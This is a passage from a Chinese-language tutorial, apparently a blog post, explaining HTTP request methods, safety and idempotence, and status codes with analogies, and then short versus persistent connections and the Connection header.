class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>状态行</strong>: <code>HTTP/1.1 200 OK</code> -&gt; 表示请求成功。</li>
<li><strong>响应头</strong>:<ul>
<li><code>Content-Type</code>: 告诉浏览器，下面发送的是一个 UTF-8 编码的 HTML 文档。</li>
<li><code>Content-Length</code>: 浏览器可以预期接收 1354 字节的 HTML 内容。</li>
<li>其他头部提供了服务器信息、时间和缓存指令。</li>
</ul>
</li>
<li><strong>空行</strong>: 分隔头部和主体。</li>
<li><strong>响应体</strong>: 包含了完整的 HTML 文档内容，浏览器将解析并渲染它。</li>
</ul>
<hr>
<h1 id="三、HTTP-请求方法与状态码"><a href="#三、HTTP-请求方法与状态码" class="headerlink" title="三、HTTP 请求方法与状态码"></a>三、HTTP 请求方法与状态码</h1><h2 id="1-请求方法-Methods"><a href="#1-请求方法-Methods" class="headerlink" title="1. 请求方法 (Methods)"></a>1. 请求方法 (Methods)</h2><p>HTTP 请求方法，也常被称为“HTTP 动词 (Verbs)”，是位于请求行开头的命令。它告诉服务器，客户端期望执行的具体操作类型。可以将其理解为一句话中的“动词”，指定了对“宾语”（即 URL 所指向的资源）的行为。</p>
<hr>
<h3 id="1-1-GET-获取资源"><a href="#1-1-GET-获取资源" class="headerlink" title="1.1 GET: 获取资源"></a>1.1 GET: 获取资源</h3><ul>
<li><p><strong>核心作用</strong>：从服务器<strong>获取 (Retrieve)</strong> 指定的资源。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li><code>GET</code> 请求<strong>不应包含请求体 (Request Body)</strong>，需要传递的参数通常附加在 URL 的查询字符串 (Query String) 中（例如 <code>?id=123</code>）。</li>
<li>它是<strong>安全的 (Safe)</strong> 和<strong>幂等的 (Idempotent)</strong>。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>浏览网页。</li>
<li>查看文章、商品详情。</li>
<li>请求图片、CSS、JavaScript 文件。</li>
<li>调用一个只返回数据的 API。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/users/123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br></pre></td></tr></table></figure>

<p>这个请求意图是获取 ID 为 123 的用户的信息。</p>
</li>
</ul>
<hr>
<h3 id="1-2-POST-创建-提交资源"><a href="#1-2-POST-创建-提交资源" class="headerlink" title="1.2 POST: 创建&#x2F;提交资源"></a>1.2 POST: 创建&#x2F;提交资源</h3><ul>
<li><p><strong>核心作用</strong>：向服务器<strong>提交 (Submit)</strong> 数据，请求服务器进行处理，这可能导致<strong>创建新资源</strong>或<strong>更新现有资源</strong>。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li><code>POST</code> 请求<strong>通常包含请求体</strong>，用于携带要提交的数据。</li>
<li>它是<strong>不安全的 (Not Safe)</strong>，因为它会改变服务器上的状态（例如，在数据库中创建一条新记录）。</li>
<li>它<strong>不是幂等的 (Not Idempotent)</strong>。连续发送两次相同的 <code>POST</code> 请求，通常会导致创建两个不同的资源。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>用户注册、登录。</li>
<li>提交表单数据（如发布评论、创建文章）。</li>
<li>下订单。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;alice<span class="variable">@example</span>.com&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个请求意图是在服务器上创建一个新用户。</p>
</li>
</ul>
<hr>
<h3 id="1-3-PUT-完整更新资源"><a href="#1-3-PUT-完整更新资源" class="headerlink" title="1.3 PUT: 完整更新资源"></a>1.3 PUT: 完整更新资源</h3><ul>
<li><p><strong>核心作用</strong>：用请求体中的数据<strong>替换 (Replace)</strong> 目标资源的所有当前表示。可以理解为“<strong>整体覆盖</strong>”。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li><code>PUT</code> 请求<strong>必须包含请求体</strong>，代表了该资源的最终完整状态。</li>
<li>它是<strong>不安全的</strong>，因为它会修改资源。</li>
<li>它<strong>是幂等的</strong>。多次发送同一个 <code>PUT</code> 请求，其效果与发送一次完全相同（最终资源的状态是一样的）。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>更新一个用户的完整个人资料。</li>
<li>替换一篇文章的全部内容。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/users/123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice Smith&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;alice.smith<span class="variable">@example</span>.com&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个请求意图是将 ID 为 123 的用户的全部信息替换为请求体中的新信息。</p>
</li>
</ul>
<hr>
<h3 id="1-4-DELETE-删除资源"><a href="#1-4-DELETE-删除资源" class="headerlink" title="1.4 DELETE: 删除资源"></a>1.4 DELETE: 删除资源</h3><ul>
<li><p><strong>核心作用</strong>：<strong>删除 (Delete)</strong> 指定的资源。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li><code>DELETE</code> 请求通常<strong>不包含请求体</strong>。</li>
<li>它是<strong>不安全的</strong>，因为它会删除资源。</li>
<li>它<strong>是幂等的</strong>。删除一个已删除的资源，其最终状态（不存在）与第一次删除时相同。服务器可能会返回 <code>404 Not Found</code> 或 <code>204 No Content</code>。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>删除一篇文章。</li>
<li>删除用户的某个地址。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/users/123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br></pre></td></tr></table></figure>

<p>这个请求意图是删除 ID 为 123 的用户。</p>
</li>
</ul>
<hr>
<h3 id="1-5-HEAD-获取资源的元信息"><a href="#1-5-HEAD-获取资源的元信息" class="headerlink" title="1.5 HEAD: 获取资源的元信息"></a>1.5 HEAD: 获取资源的元信息</h3><ul>
<li><p><strong>核心作用</strong>：与 <code>GET</code> 方法完全相同，但服务器的响应中<strong>只包含头部 (Headers)，不包含响应体 (Body)</strong>。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li>它是<strong>安全的</strong>和<strong>幂等的</strong>。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>在下载大文件前，先用 <code>HEAD</code> 请求检查文件大小 (<code>Content-Length</code>)。</li>
<li>检查资源的最后修改时间 (<code>Last-Modified</code>)，以判断是否需要重新下载。</li>
<li>检查资源是否存在，而无需传输整个资源。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HEAD</span> <span class="string">/large-video.mp4</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>media.example.com</span><br></pre></td></tr></table></figure>

<p>服务器会返回 <code>200 OK</code> 以及 <code>Content-Length</code>, <code>Content-Type</code> 等头部，但不会传输视频数据。</p>
</li>
</ul>
<hr>
<h3 id="1-6-OPTIONS-查询服务器支持的方法"><a href="#1-6-OPTIONS-查询服务器支持的方法" class="headerlink" title="1.6 OPTIONS: 查询服务器支持的方法"></a>1.6 OPTIONS: 查询服务器支持的方法</h3><ul>
<li><p><strong>核心作用</strong>：查询指定 URL 的服务器支持哪些 HTTP 请求方法。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li>它是<strong>安全的</strong>和<strong>幂等的</strong>。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li><strong>CORS (跨源资源共享)</strong> 中的“预检请求 (Preflight Request)”。在发送复杂的跨域请求（如 <code>PUT</code> 或带自定义头部的 <code>POST</code>）之前，浏览器会自动发送一个 <code>OPTIONS</code> 请求，以确认服务器是否允许该跨域操作。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/users/123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br></pre></td></tr></table></figure>

<p>服务器的响应头中会包含 <code>Allow: GET, PUT, DELETE, HEAD, OPTIONS</code> 这样的字段。</p>
</li>
</ul>
<hr>
<h3 id="1-7-PATCH-部分更新资源"><a href="#1-7-PATCH-部分更新资源" class="headerlink" title="1.7 PATCH: 部分更新资源"></a>1.7 PATCH: 部分更新资源</h3><ul>
<li><p><strong>核心作用</strong>：对资源进行<strong>局部修改 (Partial Modification)</strong>。</p>
</li>
<li><p><strong>特性</strong>：</p>
<ul>
<li><code>PATCH</code> 请求<strong>必须包含请求体</strong>，其中描述了要进行的更改（例如，要修改哪个字段，改成什么值）。</li>
<li>它是<strong>不安全的</strong>。</li>
<li>它<strong>不一定是幂等的</strong>。例如，一个“将商品价格加 10 元”的 <code>PATCH</code> 请求，执行多次效果就不同。但一个“将商品价格设为 100 元”的 <code>PATCH</code> 请求就是幂等的。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li>只修改用户的手机号，而无需上传用户的全部信息。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PATCH</span> <span class="string">/users/123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-patch+json</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[&#123;<span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/email&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;new.email@example.com&quot;</span>&#125;]</span></span></span><br></pre></td></tr></table></figure>

<p>这个请求意图是只将 ID 为 123 的用户的 <code>email</code> 字段替换为新值。</p>
</li>
</ul>
<hr>
<h3 id="1-8-安全与幂等性-Safety-and-Idempotence"><a href="#1-8-安全与幂等性-Safety-and-Idempotence" class="headerlink" title="1.8 安全与幂等性 (Safety and Idempotence)"></a>1.8 安全与幂等性 (Safety and Idempotence)</h3><p>这两个概念是理解和正确使用 HTTP 方法的关键。</p>
<ul>
<li><strong>安全 (Safe)</strong><ul>
<li><strong>定义</strong>：一个方法被称为“安全”的，是指执行它<strong>不会改变服务器上的资源状态</strong>。换句话说，它是“只读”的。</li>
<li><strong>安全的方法</strong>：<code>GET</code>, <code>HEAD</code>, <code>OPTIONS</code>。</li>
<li><strong>目的</strong>：客户端（包括搜索引擎爬虫）可以无顾虑地、自动地发起安全请求，因为它们知道这不会产生任何副作用。</li>
</ul>
</li>
<li><strong>幂等 (Idempotent)</strong><ul>
<li><strong>定义</strong>：一个方法被称为“幂等”的，是指<strong>对同一个资源执行一次或多次相同的请求，产生的最终效果是完全相同的</strong>。</li>
<li><strong>幂等的方法</strong>：<code>GET</code>, <code>HEAD</code>, <code>PUT</code>, <code>DELETE</code>, <code>OPTIONS</code>。</li>
<li><strong>不幂等的方法</strong>：<code>POST</code> (通常)，<code>PATCH</code> (可能)。</li>
<li><strong>目的</strong>：幂等性在网络不稳定的情况下非常重要。如果一个请求超时，客户端不知道服务器是否已处理。如果方法是幂等的，客户端就可以<strong>安全地重试</strong>该请求，而不用担心会创建重复数据或产生意外的副作用。</li>
</ul>
</li>
</ul>
<p><strong>总结表</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">核心作用</th>
<th align="left">请求体</th>
<th align="left">安全性</th>
<th align="left">幂等性</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>GET</strong></td>
<td align="left">获取资源</td>
<td align="left">无</td>
<td align="left">安全</td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>POST</strong></td>
<td align="left">创建&#x2F;提交资源</td>
<td align="left">有</td>
<td align="left">不安全</td>
<td align="left"><strong>否</strong></td>
</tr>
<tr>
<td align="left"><strong>PUT</strong></td>
<td align="left">完整更新资源</td>
<td align="left">有</td>
<td align="left">不安全</td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>DELETE</strong></td>
<td align="left">删除资源</td>
<td align="left">无</td>
<td align="left">不安全</td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>HEAD</strong></td>
<td align="left">获取元信息</td>
<td align="left">无</td>
<td align="left">安全</td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>PATCH</strong></td>
<td align="left">部分更新资源</td>
<td align="left">有</td>
<td align="left">不安全</td>
<td align="left"><strong>不一定</strong></td>
</tr>
<tr>
<td align="left"><strong>OPTIONS</strong></td>
<td align="left">查询支持方法</td>
<td align="left">无</td>
<td align="left">安全</td>
<td align="left"><strong>是</strong></td>
</tr>
</tbody></table>
<hr>
<h2 id="2-状态码-Status-Codes"><a href="#2-状态码-Status-Codes" class="headerlink" title="2. 状态码 (Status Codes)"></a>2. 状态码 (Status Codes)</h2><p>HTTP 状态码是包含在响应报文状态行中的一个三位数字代码。它的第一个数字定义了响应的类别，共有五大类。</p>
<ul>
<li><strong>1xx (信息性)</strong>: 表示请求已被接收，继续处理。</li>
<li><strong>2xx (成功)</strong>: 表示请求已成功被服务器接收、理解、并接受。</li>
<li><strong>3xx (重定向)</strong>: 表示需要客户端采取进一步的操作才能完成请求。</li>
<li><strong>4xx (客户端错误)</strong>: 表示客户端的请求有错误，服务器无法处理。</li>
<li><strong>5xx (服务器错误)</strong>: 表示服务器在处理一个看似有效的请求时发生了错误。</li>
</ul>
<hr>
<h3 id="2-1-1xx-信息性-Informational"><a href="#2-1-1xx-信息性-Informational" class="headerlink" title="2.1 1xx (信息性) - Informational"></a>2.1 1xx (信息性) - Informational</h3><p>这类状态码表示服务器已收到请求的一部分，并告知客户端可以继续发送剩余部分，或者如果请求已经完成，就忽略这个响应。在日常开发中很少直接处理它们。</p>
<ul>
<li><strong><code>100 Continue</code></strong><ul>
<li><strong>含义</strong>: 服务器已收到请求的头部，客户端应继续发送请求体。</li>
<li><strong>使用场景</strong>: 当客户端需要发送一个很大的请求体（如上传大文件）时，它可以先发送一个带有 <code>Expect: 100-continue</code> 头部的请求。服务器如果愿意接收，就返回 <code>100 Continue</code>，客户端再开始传输数据。如果服务器不愿接收（如因权限不足），它可以直接返回一个 4xx 错误，从而避免了大量数据的无效传输。</li>
<li><strong>类比</strong>: 你想给朋友一个大包裹，你先打电话问：“我准备好了一个大包裹要送给你，你方便收吗？” 朋友回答：“方便，你送过来吧！” (<code>100 Continue</code>)。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-2xx-成功-Success"><a href="#2-2-2xx-成功-Success" class="headerlink" title="2.2 2xx (成功) - Success"></a>2.2 2xx (成功) - Success</h3><p>这是我们最希望看到的响应，表示请求被成功处理。</p>
<ul>
<li><strong><code>200 OK</code></strong><ul>
<li><strong>含义</strong>: 请求成功。这是最常见的成功状态码。</li>
<li><strong>使用场景</strong>:<ul>
<li>对于 <code>GET</code> 和 <code>HEAD</code> 请求，表示资源已成功获取，并在响应体中包含了该资源。</li>
<li>对于 <code>POST</code> 请求，响应体中可能包含了操作的结果。</li>
</ul>
</li>
<li><strong>类比</strong>: 你去餐厅点了一份“宫保鸡丁”，服务员成功地把“宫保鸡丁”端到了你的桌上。</li>
</ul>
</li>
<li><strong><code>201 Created</code></strong><ul>
<li><strong>含义</strong>: 请求成功，并且服务器创建了一个新的资源。</li>
<li><strong>使用场景</strong>: 通常是 <code>POST</code> 或 <code>PUT</code> 请求的结果。例如，通过 API <code>POST /users</code> 创建一个新用户后，服务器返回 <code>201 Created</code>。响应头中的 <code>Location</code> 字段通常会包含新资源的 URL，例如 <code>Location: /users/123</code>。</li>
<li><strong>类比</strong>: 你在网上提交了自定义手机的订单，系统回复你：“订单已创建，您的订单号是 XXX”。</li>
</ul>
</li>
<li><strong><code>204 No Content</code></strong><ul>
<li><strong>含义</strong>: 服务器成功处理了请求，但没有返回任何内容。响应报文中不包含响应体。</li>
<li><strong>使用场景</strong>:<ul>
<li><code>DELETE</code> 请求成功删除资源后。资源已经没了，自然没有内容可返回。</li>
<li>客户端通过 <code>PUT</code> 请求更新了资源，服务器只想确认操作已完成，而不想把整个资源再发回一遍。</li>
</ul>
</li>
<li><strong>类比</strong>: 你让智能音箱“关灯”，它执行了操作，然后就安静了。任务完成，无需多言。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-3xx-重定向-Redirection"><a href="#2-3-3xx-重定向-Redirection" class="headerlink" title="2.3 3xx (重定向) - Redirection"></a>2.3 3xx (重定向) - Redirection</h3><p>这类状态码告诉客户端，为了完成请求，需要执行一些额外的操作，通常是跳转到另一个 URL。</p>
<ul>
<li><strong><code>301 Moved Permanently</code> (永久重定向)</strong><ul>
<li><strong>含义</strong>: 请求的资源已被<strong>永久</strong>移动到 <code>Location</code> 头部指定的新 URL。</li>
<li><strong>使用场景</strong>: 网站更换域名（<code>http://old.com</code> -&gt; <code>http://new.com</code>），或者 URL 结构重构。</li>
<li><strong>客户端行为</strong>: 浏览器会自动跳转到新地址。搜索引擎会更新其索引，将权重从旧地址转移到新地址。</li>
<li><strong>类比</strong>: 一家商店永久搬迁，在旧店门上贴了告示：“我们已搬至新街 1 号，请前往新址”。</li>
</ul>
</li>
<li><strong><code>302 Found</code> (临时重定向)</strong><ul>
<li><strong>含义</strong>: 请求的资源<strong>临时</strong>位于 <code>Location</code> 头部指定的新 URL。</li>
<li><strong>使用场景</strong>:<ul>
<li>未登录用户访问需要登录的页面，服务器将其重定向到登录页，登录成功后再跳回原页面。</li>
<li>网站A&#x2F;B测试，临时将部分用户导向不同版本的页面。</li>
</ul>
</li>
<li><strong>客户端行为</strong>: 浏览器会自动跳转到新地址，但搜索引擎不会更新索引，仍然会抓取原始 URL。</li>
<li><strong>类比</strong>: 你常走的路因为临时施工被封了，交警指示你走旁边的绕行路线。你知道明天这条路可能就恢复通行了。</li>
</ul>
</li>
<li><strong><code>304 Not Modified</code> (未修改)</strong><ul>
<li><strong>含义</strong>: 资源未被修改，客户端可以使用本地缓存的版本。</li>
<li><strong>使用场景</strong>: 这是<strong>协商缓存</strong>的核心。客户端在请求时带上 <code>If-None-Match</code> 或 <code>If-Modified-Since</code> 头部，服务器发现资源没有变化，就返回 <code>304</code>。这个响应<strong>不包含响应体</strong>，极大地节省了带宽。</li>
<li><strong>类比</strong>: 你问朋友：“昨天跟你聊完之后，有啥新情况吗？” 朋友回答：“没，一切照旧。” (<code>304</code>)，于是你就不需要再听一遍同样的故事了。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-4-4xx-客户端错误-Client-Error"><a href="#2-4-4xx-客户端错误-Client-Error" class="headerlink" title="2.4 4xx (客户端错误) - Client Error"></a>2.4 4xx (客户端错误) - Client Error</h3><p>这类状态码表示错误是由客户端引起的。</p>
<ul>
<li><strong><code>400 Bad Request</code></strong><ul>
<li><strong>含义</strong>: 服务器无法理解客户端的请求。这是一个通用的客户端错误。</li>
<li><strong>使用场景</strong>: 请求的语法有误（如头部格式错误），或请求的参数无效（如 API 要求一个数字，你却传了字符串）。</li>
<li><strong>类比</strong>: 你用含糊不清的语言点菜，服务员完全听不懂，只能说：“抱歉，您能再说一遍吗？”</li>
</ul>
</li>
<li><strong><code>401 Unauthorized</code> (未授权)</strong><ul>
<li><strong>含义</strong>: 请求需要身份验证。客户端没有提供凭证，或者提供的凭证无效。</li>
<li><strong>使用场景</strong>: 访问需要登录才能查看的页面或 API。</li>
<li><strong>关键点</strong>: 它表示“<strong>你谁啊？请先登录&#x2F;证明你的身份</strong>”。</li>
<li><strong>类比</strong>: 你想进一个会员制俱乐部，但门口的保安拦住了你，说：“请出示您的会员卡。”</li>
</ul>
</li>
<li><strong><code>403 Forbidden</code> (禁止访问)</strong><ul>
<li><strong>含义</strong>: 服务器理解你的请求，但拒绝执行。与 <code>401</code> 不同，即使提供了身份验证，也无权访问。</li>
<li><strong>使用场景</strong>: 一个普通用户尝试访问管理员才能进入的后台管理页面。服务器知道你是谁 (<code>401</code> 已通过)，但你的“权限”不够。</li>
<li><strong>关键点</strong>: 它表示“<strong>我知道你是谁，但你没资格来这里</strong>”。</li>
<li><strong>类比</strong>: 你出示了会员卡（通过了 <code>401</code>），但想进入“仅限白金会员”的区域，保安拦住你说：“抱歉，您的会员等级不够，不能进入此区域。”</li>
</ul>
</li>
<li><strong><code>404 Not Found</code> (未找到)</strong><ul>
<li><strong>含义</strong>: 服务器上没有找到请求的资源。这是互联网上最著名的状态码之一。</li>
<li><strong>使用场景</strong>: 访问一个不存在的 URL。</li>
<li><strong>类比</strong>: 你去图书馆按书号找一本书，但图书管理员告诉你：“对不起，我们馆里没有这本书。”</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-5-5xx-服务器错误-Server-Error"><a href="#2-5-5xx-服务器错误-Server-Error" class="headerlink" title="2.5 5xx (服务器错误) - Server Error"></a>2.5 5xx (服务器错误) - Server Error</h3><p>这类状态码表示服务器在处理请求的过程中发生了内部错误。</p>
<ul>
<li><strong><code>500 Internal Server Error</code> (内部服务器错误)</strong><ul>
<li><strong>含义</strong>: 服务器遇到了一个未曾预料的状况，导致其无法完成请求。这是一个非常笼统的错误。</li>
<li><strong>使用场景</strong>: 应用程序代码出现 Bug（如空指针、数据库异常未捕获等）。这是开发人员最不希望用户看到，但也最常用来捕获未知异常的状态码。</li>
<li><strong>类比</strong>: 餐厅后厨突然着火了，一片混乱，你的菜肯定做不出来了。</li>
</ul>
</li>
<li><strong><code>502 Bad Gateway</code> (错误网关)</strong><ul>
<li><strong>含义</strong>: 服务器作为网关或代理，从上游服务器收到了无效的响应。</li>
<li><strong>使用场景</strong>: 你的请求先到达一个 Nginx 反向代理，Nginx 再把请求转发给后端的应用服务器（如 Tomcat）。如果此时 Tomcat 应用崩溃了或没响应，Nginx 就会向客户端返回 <code>502</code>。</li>
<li><strong>关键点</strong>: 问题出在“上游”，而不是当前的网关服务器本身。</li>
<li><strong>类比</strong>: 你打电话给公司总机（网关），总机帮你转接到销售部（上游服务器），但销售部的电话是忙音或无人接听。总机只好告诉你：“抱歉，无法接通销售部。”</li>
</ul>
</li>
<li><strong><code>503 Service Unavailable</code> (服务不可用)</strong><ul>
<li><strong>含义</strong>: 服务器当前无法处理请求，通常是暂时的。</li>
<li><strong>使用场景</strong>:<ul>
<li>服务器因过载而无法处理更多请求（如双十一抢购）。</li>
<li>服务器正在停机维护。</li>
</ul>
</li>
<li><strong>关键点</strong>: 这是一个<strong>临时</strong>状态，稍后可能会恢复。响应中可能会包含 <code>Retry-After</code> 头部，建议客户端在多久之后再试。</li>
<li><strong>类比</strong>: 你常去的餐厅因为今天客人太多，门口挂上了“今日客满，请稍后再来”的牌子。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="四、HTTP-核心机制与特性"><a href="#四、HTTP-核心机制与特性" class="headerlink" title="四、HTTP 核心机制与特性"></a>四、HTTP 核心机制与特性</h1><h2 id="1-连接管理"><a href="#1-连接管理" class="headerlink" title="1. 连接管理"></a>1. 连接管理</h2><p>HTTP 协议本身是无状态的，但它需要依赖下层有状态的 TCP 协议来传输报文。如何管理和使用这些 TCP 连接，对 Web 的性能有着决定性的影响。</p>
<h3 id="1-1-短连接-vs-长连接-Persistent-Connection-Keep-Alive"><a href="#1-1-短连接-vs-长连接-Persistent-Connection-Keep-Alive" class="headerlink" title="1.1 短连接 vs 长连接 (Persistent Connection &#x2F; Keep-Alive)"></a>1.1 短连接 vs 长连接 (Persistent Connection &#x2F; Keep-Alive)</h3><p>这是 HTTP 连接管理的两种基本模式，代表了从 HTTP&#x2F;1.0 到 HTTP&#x2F;1.1 的一个重要演进。</p>
<h4 id="1-1-1-短连接-Short-lived-Connections-HTTP-1-0-默认模式"><a href="#1-1-1-短连接-Short-lived-Connections-HTTP-1-0-默认模式" class="headerlink" title="1.1.1 短连接 (Short-lived Connections) - HTTP&#x2F;1.0 默认模式"></a>1.1.1 短连接 (Short-lived Connections) - HTTP&#x2F;1.0 默认模式</h4><ul>
<li><p><strong>工作方式</strong>: 每次 HTTP 通信，客户端都需要与服务器建立一个新的 TCP 连接。通信结束后（即收到响应报文后），该 TCP 连接立即被关闭。</p>
</li>
<li><p><strong>流程</strong>:</p>
<ol>
<li>建立 TCP 连接（三次握手）。</li>
<li>客户端发送 HTTP 请求。</li>
<li>服务器发送 HTTP 响应。</li>
<li>关闭 TCP 连接（四次挥手）。</li>
</ol>
<ul>
<li><em>如果页面上还有其他资源（如图片、CSS），则对每个资源重复以上 4 个步骤。</em></li>
</ul>
</li>
<li><p><strong>缺点</strong>:</p>
<ul>
<li><strong>性能极差</strong>: 每个资源都需要一次完整的 TCP 连接建立和关闭过程。TCP 的三次握手本身就需要至少 1 个 RTT（Round-Trip Time，往返时间），这在请求大量小文件时会累积成巨大的延迟。</li>
<li><strong>资源消耗</strong>: 频繁地创建和销毁连接，对客户端和服务器都造成了不小的 CPU 和内存开销。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-1-2-长连接-Persistent-Connections-Keep-Alive-HTTP-1-1-默认模式"><a href="#1-1-2-长连接-Persistent-Connections-Keep-Alive-HTTP-1-1-默认模式" class="headerlink" title="1.1.2 长连接 (Persistent Connections &#x2F; Keep-Alive) - HTTP&#x2F;1.1 默认模式"></a>1.1.2 长连接 (Persistent Connections &#x2F; Keep-Alive) - HTTP&#x2F;1.1 默认模式</h4><ul>
<li><strong>工作方式</strong>: 在一次 HTTP 通信结束后，TCP 连接不会立即关闭，而是保持打开状态（“keep-alive”）。后续对该服务器的 HTTP 请求可以<strong>复用</strong>这条已经建立的 TCP 连接。</li>
<li><strong>流程</strong>:<ol>
<li>建立 TCP 连接（三次握手）。</li>
<li>客户端发送请求 #1 (e.g., <code>index.html</code>)。</li>
<li>服务器发送响应 #1。</li>
<li>客户端在<strong>同一条连接上</strong>发送请求 #2 (e.g., <code>style.css</code>)。</li>
<li>服务器发送响应 #2。</li>
<li>…（重复4和5）…</li>
<li>当一方决定关闭（如浏览器关闭页面）或连接空闲超时后，关闭 TCP 连接。</li>
</ol>
</li>
<li><strong>优点</strong>:<ul>
<li><strong>显著提升性能</strong>: 避免了多次 TCP 握手和慢启动的开销，大大降低了延迟。</li>
<li><strong>减少资源消耗</strong>: 减少了服务器和客户端因建立和关闭连接而产生的负担。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-Connection-头部的作用"><a href="#1-2-Connection-头部的作用" class="headerlink" title="1.2 Connection 头部的作用"></a>1.2 <code>Connection</code> 头部的作用</h3><p><code>Connection</code> 头部是控制连接模式的核心开关。它是一个“逐跳 (hop-by-hop)”头部，只对单次 TCP 连接有效，不会被代理服务器转发。</p>
<ul>
<li><p><strong>在 HTTP&#x2F;1.0 中</strong>:</p>
<ul>
<li><p>默认是短连接。</p>
</li>
<li><p>如果客户端希望使用长连接，需要在请求头中明确指出：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果服务器也同意，它会在响应头中同样返回 <code>Connection: keep-alive</code>。</p>
</li>
</ul>
</li>
<li><p><strong>在 HTTP&#x2F;1.1 中</strong>:</p>
<ul>
<li><p><strong>默认就是长连接</strong>。因此，理论上不再需要发送 <code>Connection: keep-alive</code>（但为了兼容旧的代理，很多浏览器仍然会发送它）。</p>
</li>
